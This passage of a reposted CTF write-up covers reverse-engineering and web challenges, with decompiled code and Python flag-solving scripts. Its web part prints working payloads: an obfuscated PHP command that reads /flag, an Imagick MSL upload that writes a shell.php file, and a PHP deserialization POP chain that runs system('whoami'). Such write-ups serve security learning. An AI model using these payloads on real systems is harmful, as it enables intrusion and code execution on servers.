class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall main(int argc, const char **argv)</span><br><span class="line">&#123;</span><br><span class="line">  std::</span><br><span class="line">ostream *v2; // rax</span><br><span class="line">  std::</span><br><span class="line">string::</span><br><span class="line">iterator __for_end; // [rsp+20h] [rbp-80h] BYREF</span><br><span class="line">  std::</span><br><span class="line">string::</span><br><span class="line">iterator __for_begin; // [rsp+28h] [rbp-78h] BYREF</span><br><span class="line">  uint8_t data[24]; // [rsp+30h] [rbp-70h]</span><br><span class="line">  std::</span><br><span class="line">string usr_input; // [rsp+50h] [rbp-50h] BYREF</span><br><span class="line">  uint8_t enc_; // [rsp+7Fh] [rbp-21h]</span><br><span class="line">  char *c; // [rsp+80h] [rbp-20h]</span><br><span class="line">  std::</span><br><span class="line">string *__for_range; // [rsp+88h] [rbp-18h]</span><br><span class="line">  int rotate_count; // [rsp+94h] [rbp-Ch]</span><br><span class="line">  int i; // [rsp+98h] [rbp-8h]</span><br><span class="line">  int correct_num; // [rsp+9Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  correct_num = 0;</span><br><span class="line">  std::</span><br><span class="line">string::</span><br><span class="line">basic_string(&amp;usr_input);</span><br><span class="line">  std::</span><br><span class="line">operator&gt;&gt;&lt;char&gt;(refptr__ZSt3cin);</span><br><span class="line">  *(_QWORD *)data = 0xB3B78DA987B3B383ui64;</span><br><span class="line">  *(_QWORD *)&amp;data[8] = 0xA5BEA98B8FBEAB9Fui64;</span><br><span class="line">  *(_QWORD *)&amp;data[16] = 0xBB9BAB9DBE899D83ui64;</span><br><span class="line">  rotate_count = rand() % 7 + 1;</span><br><span class="line">  i = 0;</span><br><span class="line">  __for_range = &amp;usr_input;</span><br><span class="line">  __for_begin._M_current = (char *)std::</span><br><span class="line">string::</span><br><span class="line">begin(&amp;usr_input);</span><br><span class="line">  __for_end._M_current = (char *)std::</span><br><span class="line">string::</span><br><span class="line">end(__for_range);</span><br><span class="line">  while ( __gnu_cxx::</span><br><span class="line">operator!=&lt;char *,std::</span><br><span class="line">string&gt;(&amp;__for_begin, &amp;__for_end) )</span><br><span class="line">  &#123;</span><br><span class="line">    c = __gnu_cxx::</span><br><span class="line">__normal_iterator&lt;char *,std::</span><br><span class="line">string&gt;::</span><br><span class="line">operator*(&amp;__for_begin);</span><br><span class="line">    enc_ = func1(*c, rotate_count);</span><br><span class="line">    if ( enc_ == data[i] )</span><br><span class="line">      ++correct_num;</span><br><span class="line">    ++i;</span><br><span class="line">    __gnu_cxx::</span><br><span class="line">__normal_iterator&lt;char *,std::</span><br><span class="line">string&gt;::</span><br><span class="line">operator++(&amp;__for_begin);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( correct_num == 24 )</span><br><span class="line">    v2 = (std::</span><br><span class="line">ostream *)std::</span><br><span class="line">operator&lt;&lt;&lt;std::</span><br><span class="line">char_traits&lt;char&gt;&gt;(refptr__ZSt4cout, &quot;Correct!&quot;);</span><br><span class="line">  else</span><br><span class="line">    v2 = (std::</span><br><span class="line">ostream *)std::</span><br><span class="line">operator&lt;&lt;&lt;std::</span><br><span class="line">char_traits&lt;char&gt;&gt;(refptr__ZSt4cout, &quot;No!&quot;);</span><br><span class="line">  refptr__ZSt4endlIcSt11char_traitsIcEERSt13basic_ostreamIT_T0_ES6_(v2);</span><br><span class="line">  std::</span><br><span class="line">string::~string(&amp;usr_input);</span><br><span class="line">  return 0i64;</span><br><span class="line">&#125;</span><br><span class="line">std::</span><br><span class="line">string::</span><br><span class="line">basic_string(&amp;usr_input);</span><br><span class="line">std::</span><br><span class="line">operator&gt;&gt;&lt;char&gt;(refptr__ZSt3cin);</span><br><span class="line">rotate_count = rand() % 7 + 1;</span><br><span class="line">i = 0;</span><br><span class="line">__for_range = &amp;usr_input;</span><br><span class="line">__for_begin._M_current = (char *)std::</span><br><span class="line">string::</span><br><span class="line">begin(&amp;usr_input);</span><br><span class="line">__for_end._M_current = (char *)std::</span><br><span class="line">string::</span><br><span class="line">end(__for_range);</span><br><span class="line">while ( __gnu_cxx::</span><br><span class="line">operator!=&lt;char *,std::</span><br><span class="line">string&gt;(&amp;__for_begin, &amp;__for_end) )</span><br><span class="line">&#123;</span><br><span class="line">  c = __gnu_cxx::</span><br><span class="line">__normal_iterator&lt;char *,std::</span><br><span class="line">string&gt;::</span><br><span class="line">operator*(&amp;__for_begin);</span><br><span class="line">  enc_ = func1(*c, rotate_count);</span><br><span class="line">  if ( enc_ == data[i] )</span><br><span class="line">    ++correct_num;</span><br><span class="line">  ++i;</span><br><span class="line">  __gnu_cxx::</span><br><span class="line">__normal_iterator&lt;char *,std::</span><br><span class="line">string&gt;::</span><br><span class="line">operator++(&amp;__for_begin);</span><br><span class="line">&#125;</span><br><span class="line">uint8_t __cdecl func1(uint8_t value, uint8_t n)</span><br><span class="line">&#123;</span><br><span class="line">  uint8_t enc_step_one; // [rsp+2Fh] [rbp-1h]</span><br><span class="line"></span><br><span class="line">  if ( !n || n &gt; 8u )</span><br><span class="line">    return value;</span><br><span class="line">  enc_step_one = func1_1(value, n);</span><br><span class="line">  return func1_2(enc_step_one, n);</span><br><span class="line">&#125;</span><br><span class="line">uint8_t __cdecl func1_1(uint8_t value, uint8_t shift)</span><br><span class="line">&#123;</span><br><span class="line">  return ((int)value &gt;&gt; shift) | (value &lt;&lt; (8 - shift));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uint8_t __cdecl func1_2(uint8_t byte, int n)</span><br><span class="line">&#123;</span><br><span class="line">  uint8_t bytea; // [rsp+20h] [rbp+10h]</span><br><span class="line"></span><br><span class="line">  bytea = byte;</span><br><span class="line">  if ( ((byte &amp; 1) != 0) != ((((int)byte &gt;&gt; (n - 1)) &amp; 1) != 0) )</span><br><span class="line">    return (1 &lt;&lt; (n - 1)) ^ byte ^ 1;</span><br><span class="line">  return bytea;</span><br><span class="line">&#125;</span><br><span class="line">def circular_left_shift(byte, shift):</span><br><span class="line">    shifted_byte = ((byte &lt;&lt; shift) &amp; 0xFF) | (byte &gt;&gt; (8 - shift))</span><br><span class="line">    return shifted_byte</span><br><span class="line"></span><br><span class="line">def swap_bits(byte, n):  </span><br><span class="line">    n_index = n - 1 # 将n转换为0到7范围内的索引</span><br><span class="line">  </span><br><span class="line">    # 获取第1位和第n位的值</span><br><span class="line">    bit1 = byte &amp; 1               # 第1位</span><br><span class="line">    bitN = (byte &gt;&gt; n_index) &amp; 1  # 第n位</span><br><span class="line">  </span><br><span class="line">    # 如果两位不同，交换它们</span><br><span class="line">    if bit1 != bitN:</span><br><span class="line">        # 翻转第1位</span><br><span class="line">        byte ^= 1</span><br><span class="line">        # 翻转第n位</span><br><span class="line">        byte ^= (1 &lt;&lt; n_index)</span><br><span class="line">  </span><br><span class="line">    return byte</span><br><span class="line"></span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">data = [ 0x83, 0xb3, 0xb3, 0x87, 0xa9, 0x8d, 0xb7, 0xb3, 0x9f, 0xab, 0xbe, 0x8f, 0x8b, 0xa9, 0xbe, 0xa5, 0x83, 0x9d, 0x89, 0xbe, 0x9d, 0xab, 0x9b, 0xbb ]</span><br><span class="line">for n in data:</span><br><span class="line">  swap_data = swap_bits(n, 7)</span><br><span class="line">  shift_data = circular_left_shift(swap_data, 7)</span><br><span class="line">  flag += chr(shift_data)</span><br><span class="line">print(flag)</span><br><span class="line"># ayyctf&#123;you_get_rand_num&#125;</span><br><span class="line">File size Ratio Format Name</span><br><span class="line"> -------------------- ------ ----------- -----------</span><br><span class="line">upx: ../finalpack: CantUnpackException: l_info corrupted</span><br><span class="line"></span><br><span class="line">Unpacked 1 file: 0 ok, 1 error.</span><br><span class="line">LEA RDI =&gt;local_68 ,[RBP + -0x60 ]</span><br><span class="line">CALL thunk_FUN_00421290</span><br><span class="line">def left_rotate_string(s, n):</span><br><span class="line">    return s[n:] + s[:n]</span><br><span class="line"></span><br><span class="line">s = &quot;02CD290D5ACE1A83&quot;</span><br><span class="line">n = 0xB</span><br><span class="line">print(left_rotate_string(s, n)) #E1A8302CD290D5AC</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">    &lt;startup&gt; </span><br><span class="line">        &lt;supportedRuntime version=&quot;v4.0&quot; sku=&quot;.NETFramework,Version=v4.7.2&quot; /&gt;</span><br><span class="line">    &lt;/startup&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br><span class="line">def decrypt_image_bytes(encrypted_bytes):</span><br><span class="line">    decrypted_bytes = bytearray(len(encrypted_bytes))</span><br><span class="line">  </span><br><span class="line">    for i, b in enumerate(encrypted_bytes):</span><br><span class="line">        b = ~b &amp; 0xFF # 取反</span><br><span class="line">        b = ((b &amp; 0xF8) &gt;&gt; 3) | ((b &amp; 0x7) &lt;&lt; 5) # 恢复高低位的顺序</span><br><span class="line">        b = (b + 1) &amp; 0xFF # 加 1</span><br><span class="line">    </span><br><span class="line">        decrypted_bytes[i] = b</span><br><span class="line">  </span><br><span class="line">    return bytes(decrypted_bytes)</span><br><span class="line"></span><br><span class="line">with open(&#x27;enc.png&#x27;, &#x27;rb&#x27;) as f:</span><br><span class="line">    encrypted_data = f.read()</span><br><span class="line"></span><br><span class="line">decrypted_data = decrypt_image_bytes(encrypted_data)</span><br><span class="line">with open(&#x27;dec.png&#x27;, &#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(decrypted_data)</span><br><span class="line">for (int i = 1; i &lt; a2; i++) &#123;</span><br><span class="line">        a1[i - 1] ^= a1[i];</span><br><span class="line">&#125;</span><br><span class="line">def decrypt(cipher):</span><br><span class="line">    length = len(cipher)</span><br><span class="line">    for i in range(length - 1, 0, -1):</span><br><span class="line">        cipher[i - 1] ^= cipher[i]</span><br><span class="line">    return bytes(cipher).decode(&#x27;utf-8&#x27;)</span><br><span class="line"></span><br><span class="line">cipher = [0x18, 0x00, 0x1a, 0x17, 0x12, 0x1d, 0x1a, 0x05, 0x0a, 0x56, 0x09, 0x03, 0x5c, 0x0f, 0x12, 0x17, 0x5d, 0x09, 0x02, 0x03, 0x5b, 0x0b, 0x05, 0x5d, 0x08, 0x50, 0x05, 0x5d, 0x08, 0x03, 0x53, 0x13, 0x0f, 0x7d]</span><br><span class="line">plain_text = decrypt(cipher)</span><br><span class="line">print(plain_text)</span><br><span class="line"># ayyctf&#123;adn812nasd9021jad91ad912ar&#125;</span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: xxx.xxx.xxx.xxx:80</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 636</span><br><span class="line"></span><br><span class="line">cmd=%24%5f%5f%29%3b%24%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2d%2d%24%5f%5f%3b%24%5f%5f%5f%5f%5f%3d%28%28%5f%2f%5f%29%2e%27%27%29%7b%24%5f%5f%7d%3b%24%5f%5f%5f%5f%5f%5f%3d%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%24%5f%5f%5f%5f%5f%2e%24%5f%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%2b%2b%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%2e%24%5f%5f%5f%5f%3b%24%7b%24%5f%5f%5f%5f%7d%7b%5f%7d%28%24%7b%24%5f%5f%5f%5f%7d%7b%5f%5f%7d%29%3b%2f%2f&amp;_=highlight_file&amp;__=/flag</span><br><span class="line">POST /?class=Imagick&amp;arg=vid:</span><br><span class="line">msl:/tmp/php* HTTP/1.1</span><br><span class="line">Host: localhost:</span><br><span class="line">8080</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US;q=0.9,en;q=0.8</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36</span><br><span class="line">Connection: close Cache-Control: max-age=0</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTrWYaXKoVR1wiLhP</span><br><span class="line">Content-Length: 332</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryTrWYaXKoVR1wiLhP Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;vulhub.msl&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;  &lt;read filename=&quot;caption:&amp;lt;?=phpinfo();?&amp;gt;&quot;/&gt; &lt;write filename=&quot;info:</span><br><span class="line">shell.php&quot; /&gt; </span><br><span class="line">------WebKitFormBoundaryTrWYaXKoVR1wiLhP--</span><br><span class="line">Net::</span><br><span class="line">__destruct()-&gt;Stone::</span><br><span class="line">__toString()-&gt;Works::</span><br><span class="line">__call()-&gt;Works::</span><br><span class="line">keep()-&gt;Net::</span><br><span class="line">__get()-&gt;Hill::</span><br><span class="line">__invoke()</span><br><span class="line">&lt;?php</span><br><span class="line">//highlight_file(__FILE__);</span><br><span class="line">//error_reporting(0);</span><br><span class="line">class Hill&#123;</span><br><span class="line"></span><br><span class="line">    private $cmd;</span><br><span class="line">    private $content;</span><br><span class="line"></span><br><span class="line">    public function __construct($cmd, $content)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;cmd = $cmd;</span><br><span class="line">        $this-&gt;content = $content;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        call_user_func($this-&gt;cmd, $this-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Stone</span><br><span class="line">&#123;</span><br><span class="line">    public $ctf;</span><br><span class="line">    public $game = &quot;good game!&quot;;</span><br><span class="line">    // public function __construct($ctf)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     $this-&gt;ctf = $ctf;</span><br><span class="line">    // &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;ctf-&gt;keep();</span><br><span class="line">    &#125;</span><br><span class="line">    public function keep()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;ctf . &quot; is &quot; . $this-&gt;game;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Net</span><br><span class="line">&#123;</span><br><span class="line">    private $value;</span><br><span class="line">    private $welcome = &quot;Weclome!&quot;;</span><br><span class="line">    public $banner = &quot;keep go&quot;;</span><br><span class="line">    public $key;</span><br><span class="line">    // public function __construct($key, $value)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     $this-&gt;key = $name;</span><br><span class="line">    //     $this-&gt;value = $password;</span><br><span class="line">    // &#125;</span><br><span class="line"></span><br><span class="line">    public function __set($Attribute, $value)&#123;</span><br><span class="line">        $this-&gt;$Attribute = $value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($name)</span><br><span class="line">    &#123;</span><br><span class="line">        $value = $this-&gt;key;</span><br><span class="line">        $value();</span><br><span class="line">    &#125;</span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        if ($this-&gt;welcome == &quot;go go go!&quot;) &#123;</span><br><span class="line">            echo $this-&gt;banner;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            echo &quot;stop&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public function hello()&#123;</span><br><span class="line">        echo $welcome;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Works</span><br><span class="line">&#123;</span><br><span class="line">    protected $code;</span><br><span class="line"></span><br><span class="line">    //exp</span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;code = new Net();</span><br><span class="line">        $this-&gt;code-&gt;key = new Hill(&quot;system&quot;,&quot;whoami&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        $num = $name;</span><br><span class="line">        $this-&gt;$num();</span><br><span class="line">    &#125;</span><br><span class="line">    private function keep()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// if (isset($_POST[&#x27;pop&#x27;])) &#123;</span><br><span class="line">//     $a = unserialize($_POST[&#x27;pop&#x27;]);</span><br><span class="line">//     $a-&gt;hello(&quot;welcome&quot;);</span><br><span class="line">// &#125; else &#123;</span><br><span class="line">//     die(&quot;POST and start&quot;);</span><br><span class="line">// &#125; </span><br><span class="line"></span><br><span class="line">$a = new Net();</span><br><span class="line">$a-&gt;welcome = &quot;go go go!&quot;;</span><br><span class="line">$a-&gt;banner = new Stone();</span><br><span class="line">$a-&gt;banner-&gt;ctf = new Works();</span><br><span class="line"></span><br><span class="line">$exp = urlencode(serialize($a));</span><br><span class="line">print_r(str_replace(&quot;+&quot;,&quot;%20&quot;,$exp));</span><br></pre></td></tr></table></figure>
+
+
+---
+## 附图
+
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+[图片已移除]
+
+---
+
+> **转载声明**：本文转载自 [Des-CTF-Knowledge](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge)（MIT License），版权归原作者所有，转载请注明出处；如原作者不希望被转载，请联系删除。
+> 原文链接：[https://www.ctfiot.com/199581.html](https://www.ctfiot.com/199581.html)
+> 仓库原文：[CTF大赛WP集合/articles/2024年第四届山石CTF招新赛WP_REVERSE&WEB篇.full.md](https://github.com/Dest1ny-Sec/Des-CTF-Knowledge/blob/main/CTF%E5%A4%A7%E8%B5%9BWP%E9%9B%86%E5%90%88/articles/2024%E5%B9%B4%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%B1%B1%E7%9F%B3CTF%E6%8B%9B%E6%96%B0%E8%B5%9BWP_REVERSE%26WEB%E7%AF%87.full.md)
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/C-%E5%AD%97%E7%AC%A6%E5%8F%98%E6%8D%A2/">C++ 字符变换</a></div><div class="post_share"><div class="social-share" data-image="/img/youli.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/01/01/ctf-kb/wp/Reverse/2024_KCTF_%E5%A4%A7%E8%B5%9B_-_%E7%AC%AC%E5%9B%9B%E9%A2%98-%E7%A5%9E%E7%A7%98%E4%BF%A1%E5%8F%B7-%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%8F%8A%E8%A7%A3%E6%9E%90/" title="2024 KCTF 大赛 - 第四题《神秘信号》设计思路及解析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2024 KCTF 大赛 - 第四题《神秘信号》设计思路及解析</div></div></a></div><div class="next-post pull-right"><a href="/2024/01/01/ctf-kb/wp/Reverse/2024_KCTF_%E5%A4%A7%E8%B5%9B_-_%E7%AC%AC%E5%8D%81%E9%A2%98-%E8%AF%95%E6%8E%A2-%E8%AE%BE%E8%AE%A1%E6%80%9D%E8%B7%AF%E5%8F%8A%E8%A7%A3%E6%9E%90/" title="2024 KCTF 大赛 - 第十题《试探》设计思路及解析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024 KCTF 大赛 - 第十题《试探》设计思路及解析</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/youli.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">朴冬</div><div class="author-info__description">琐碎的学习记录</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">1050</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">879</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0"><i class="fab fa-bilibili"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/PUDONGGGGGG" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="/2559874620@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a><a class="social-icon" href="https://space.bilibili.com/242470829?spm_id_from=333.1007.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #1797cf;"></i></a></div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/Dirsearch/" title="Dirsearch">Dirsearch</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/SCRIPTS-INDEX/" title="CTF 常用脚本索引">CTF 常用脚本索引</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/30/ctf-kb/%E5%B7%A5%E5%85%B7/ffuf%E7%9A%84%E4%BD%BF%E7%94%A8/" title="ffuf的使用">ffuf的使用</a><time datetime="2026-05-29T16:00:00.000Z" title="发表于 2026-05-30 00:00:00">2026-05-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2026 By 朴冬</div><div class="footer_custom_text">Welcome</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button id="chat-btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script 